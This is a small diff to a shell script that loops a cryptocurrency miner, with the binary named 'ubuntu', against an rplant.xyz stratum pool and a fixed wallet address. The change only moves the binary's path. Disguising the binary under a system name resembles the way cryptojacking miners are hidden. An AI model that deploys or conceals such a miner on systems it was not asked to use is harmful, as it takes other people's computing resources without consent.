@@ -7,6 +7,6 @@
 #       stratum-na.rplant.xyz   /Toronto/
 #
 while [ 1 ]; do
-./ubuntu77/ubuntu -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qTVTH6sB9SKQNRKmLQkS1bC7JqXNRZYqRH
+./077/ubuntu -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qTVTH6sB9SKQNRKmLQkS1bC7JqXNRZYqRH
 sleep
 done
